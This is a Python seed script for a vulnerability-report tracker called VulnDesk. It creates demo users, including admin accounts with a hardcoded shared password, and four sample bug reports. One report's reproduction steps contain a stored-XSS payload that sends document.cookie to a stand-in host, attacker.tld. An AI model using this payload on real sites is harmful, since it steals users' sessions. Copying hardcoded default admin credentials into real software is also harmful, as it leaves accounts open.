"""
Idempotent Database Seed Script (backend/app/seed.py)
=====================================================================
WHAT THIS FILE DOES:
1. On an empty database: seeds 6 users (Alice, Bob, Mallory, Charlie, Nadia,
   and the dedicated Tutor evaluator account), 4 sample vulnerability reports,
   status history entries, and comments.
2. On an existing MVP database: safely backfills Argon2id `password_hash` values
   for any seeded user missing a password and creates `tutor@vulndesk.local` if absent,
   without duplicating any existing reports or users.
=====================================================================
"""

from datetime import UTC, datetime, timedelta

from sqlmodel import Session, select

from app.database import create_db_and_tables, engine
from app.models import (
    Comment,
    Group,
    GroupMember,
    Report,
    ReportStatus,
    Severity,
    StatusHistory,
    User,
    UserRole,
)
from app.security import hash_password

DEFAULT_DEMO_PASSWORD = "DemoPass123!"
TUTOR_DEFAULT_PASSWORD = "DemoPass123!"


def _ensure_beta_passwords_and_tutor(session: Session) -> dict:
    """Backfill password hashes on existing MVP users and ensure tutor account exists."""
    now = datetime.now(UTC)
    updated_count = 0

    existing_users = session.exec(select(User)).all()
    for user in existing_users:
        if not user.password_hash:
            pw = (
                TUTOR_DEFAULT_PASSWORD
                if user.email == "tutor@vulndesk.local"
                else DEFAULT_DEMO_PASSWORD
            )
            user.password_hash = hash_password(pw)
            user.updated_at = now
            session.add(user)
            updated_count += 1

    tutor_created = False
    tutor = session.exec(
        select(User).where(User.email == "tutor@vulndesk.local")
    ).first()
    if tutor is None:
        tutor = User(
            name="Course Tutor (Evaluator)",
            email="tutor@vulndesk.local",
            role=UserRole.ADMIN.value,
            password_hash=hash_password(TUTOR_DEFAULT_PASSWORD),
            is_banned=False,
        )
        session.add(tutor)
        tutor_created = True

    if updated_count > 0 or tutor_created:
        session.commit()

    return {
        "seeded": False,
        "passwords_backfilled": updated_count,
        "tutor_created": tutor_created,
        "message": "Database already contained MVP data; Beta auth fields synced.",
    }


def seed_database(session: Session) -> dict:
    """
    Populate demo users, sample reports, status history, and comments if empty,
    or sync Beta password hashes and tutor account if MVP data already exists.
    """
    existing_user = session.exec(select(User)).first()
    if existing_user is not None:
        return _ensure_beta_passwords_and_tutor(session)

    now = datetime.now(UTC)
    demo_hash = hash_password(DEFAULT_DEMO_PASSWORD)
    tutor_hash = hash_password(TUTOR_DEFAULT_PASSWORD)

    # -----------------------------------------------------------------
    # STEP 1: Create 6 Users (5 MVP personas + 1 Dedicated Tutor account)
    # -----------------------------------------------------------------
    alice = User(
        name="Alice Rahman (Researcher)",
        email="alice@vulndesk.local",
        role=UserRole.RESEARCHER.value,
        password_hash=demo_hash,
        is_banned=False,
    )
    bob = User(
        name="Bob Karim (Researcher)",
        email="bob@vulndesk.local",
        role=UserRole.RESEARCHER.value,
        password_hash=demo_hash,
        is_banned=False,
    )
    mallory = User(
        name="Mallory Blocked (Banned Researcher)",
        email="mallory@vulndesk.local",
        role=UserRole.RESEARCHER.value,
        password_hash=demo_hash,
        is_banned=True,
    )
    charlie = User(
        name="Charlie Hossain (Security Analyst)",
        email="charlie@vulndesk.local",
        role=UserRole.ANALYST.value,
        password_hash=demo_hash,
        is_banned=False,
    )
    admin = User(
        name="Nadia Islam (Admin)",
        email="admin@vulndesk.local",
        role=UserRole.ADMIN.value,
        password_hash=demo_hash,
        is_banned=False,
    )
    tutor = User(
        name="Course Tutor (Evaluator)",
        email="tutor@vulndesk.local",
        role=UserRole.ADMIN.value,
        password_hash=tutor_hash,
        is_banned=False,
    )
    session.add_all([alice, bob, mallory, charlie, admin, tutor])
    session.flush()
    assert alice.id is not None
    assert bob.id is not None
    assert charlie.id is not None

    triage_group = session.exec(
        select(Group).where(Group.name == "Web Security Triage Team")
    ).first()
    if triage_group is None:
        triage_group = Group(
            name="Web Security Triage Team",
            description="Shared triage workspace for web vulnerabilities with mixed member permissions.",
            owner_id=alice.id,
        )
        session.add(triage_group)
        session.flush()
        assert triage_group.id is not None

        session.add_all(
            [
                GroupMember(
                    group_id=triage_group.id,
                    user_id=bob.id,
                    can_create=True,
                    can_edit=False,
                    can_assign=False,
                ),
                GroupMember(
                    group_id=triage_group.id,
                    user_id=charlie.id,
                    can_create=False,
                    can_edit=True,
                    can_assign=True,
                ),
            ]
        )

    # -----------------------------------------------------------------
    # STEP 2: Create 4 Sample Vulnerability Reports across statuses
    # -----------------------------------------------------------------
    r1 = Report(
        title="Stored XSS in Customer Support Ticket Subject",
        description=(
            "When submitting a support ticket on the merchant portal, the subject field is rendered "
            "without HTML entity encoding in the agent dashboard, allowing arbitrary JavaScript execution."
        ),
        component="Merchant Portal - Support Module",
        steps_to_reproduce=(
            "1. Log into Merchant Portal.\n"
            "2. Open 'New Support Ticket'.\n"
            "3. Enter payload `<script>fetch('https://attacker.tld/steal?c='+document.cookie)</script>`.\n"
            "4. View ticket as a support agent."
        ),
        proposed_severity=Severity.HIGH.value,
        final_severity=None,
        status=ReportStatus.NEW.value,
        reporter_id=alice.id,
        created_at=now - timedelta(days=1),
        updated_at=now - timedelta(days=1),
    )

    r2 = Report(
        title="IDOR on Invoice Download Endpoint (/api/v2/invoices/{id})",
        description=(
            "Authenticated users can download PDF invoices belonging to other organizations by "
            "incrementing the numeric invoice ID in GET /api/v2/invoices/{id} without tenant verification."
        ),
        component="Billing Service API",
        steps_to_reproduce=(
            "1. Authenticate as Organization A user.\n"
            "2. Send GET /api/v2/invoices/1042 with Org A Bearer token.\n"
            "3. Observe that Organization B's invoice PDF is returned with HTTP 200."
        ),
        proposed_severity=Severity.CRITICAL.value,
        final_severity=Severity.HIGH.value,
        status=ReportStatus.CONFIRMED.value,
        reporter_id=alice.id,
        first_responder_id=charlie.id,
        first_response_at=now - timedelta(days=2, hours=18),
        created_at=now - timedelta(days=3),
        updated_at=now - timedelta(days=2),
    )

    r3 = Report(
        title="Missing Rate Limiting on Promotional Code Redemption",
        description=(
            "The /api/v1/checkout/promo endpoint allows unlimited rapid requests from a single IP "
            "and session, making it possible to brute-force 6-character promotional codes."
        ),
        component="Checkout Service",
        steps_to_reproduce=(
            "1. Capture POST /api/v1/checkout/promo request.\n"
            "2. Replay 500 requests per minute with different promo codes.\n"
            "3. Observe no HTTP 429 response or temporary block."
        ),
        proposed_severity=Severity.MEDIUM.value,
        final_severity=None,
        status=ReportStatus.REJECTED.value,
        rejection_reason=(
            "Invalid report: Promo codes in staging use a mock validator; production enforces "
            "Cloudflare WAF rate limiting of 10 requests/minute per IP."
        ),
        reporter_id=alice.id,
        first_responder_id=charlie.id,
        first_response_at=now - timedelta(days=4),
        created_at=now - timedelta(days=5),
        updated_at=now - timedelta(days=4),
    )

    r4 = Report(
        title="Session Token Remains Valid After Password Reset on Mobile API",
        description=(
            "After a user resets their password via the mobile recovery flow, existing active sessions "
            "on other devices remain valid and can still call protected endpoints."
        ),
        component="Mobile Auth Gateway",
        steps_to_reproduce=(
            "1. Log in on Device A and save the token.\n"
            "2. Reset password on Device B.\n"
            "3. Call GET /api/mobile/profile using Device A's old token and observe 200 OK."
        ),
        proposed_severity=Severity.HIGH.value,
        final_severity=None,
        status=ReportStatus.UNDER_REVIEW.value,
        reporter_id=bob.id,
        first_responder_id=charlie.id,
        first_response_at=now - timedelta(hours=12),
        created_at=now - timedelta(days=1, hours=6),
        updated_at=now - timedelta(hours=12),
    )

    session.add_all([r1, r2, r3, r4])
    session.flush()
    assert r2.id is not None
    assert r3.id is not None
    assert r4.id is not None

    histories = [
        StatusHistory(
            report_id=r2.id,
            changed_by=charlie.id,
            from_status=ReportStatus.NEW.value,
            to_status=ReportStatus.UNDER_REVIEW.value,
            changed_at=now - timedelta(days=2, hours=18),
        ),
        StatusHistory(
            report_id=r2.id,
            changed_by=charlie.id,
            from_status=ReportStatus.UNDER_REVIEW.value,
            to_status=ReportStatus.CONFIRMED.value,
            changed_at=now - timedelta(days=2),
        ),
        StatusHistory(
            report_id=r3.id,
            changed_by=charlie.id,
            from_status=ReportStatus.NEW.value,
            to_status=ReportStatus.REJECTED.value,
            changed_at=now - timedelta(days=4),
        ),
        StatusHistory(
            report_id=r4.id,
            changed_by=charlie.id,
            from_status=ReportStatus.NEW.value,
            to_status=ReportStatus.UNDER_REVIEW.value,
            changed_at=now - timedelta(hours=12),
        ),
    ]
    session.add_all(histories)

    comments = [
        Comment(
            report_id=r2.id,
            author_id=charlie.id,
            body="Thank you Alice. We reproduced the IDOR on staging and confirmed High severity.",
            is_internal=False,
            created_at=now - timedelta(days=2, hours=16),
        ),
        Comment(
            report_id=r2.id,
            author_id=charlie.id,
            body="INTERNAL: Billing team is patching the tenant_id check in PR #412 today.",
            is_internal=True,
            created_at=now - timedelta(days=2, hours=15),
        ),
        Comment(
            report_id=r2.id,
            author_id=alice.id,
            body="Glad to help! Let me know when you'd like me to re-test the fix.",
            is_internal=False,
            created_at=now - timedelta(days=2, hours=10),
        ),
    ]
    session.add_all(comments)
    session.commit()

    return {
        "seeded": True,
        "users": 6,
        "reports": 4,
        "status_history": len(histories),
        "comments": len(comments),
    }


if __name__ == "__main__":
    create_db_and_tables()
    with Session(engine) as db_session:
        result = seed_database(db_session)
        print(f"VulnDesk seed complete: {result}")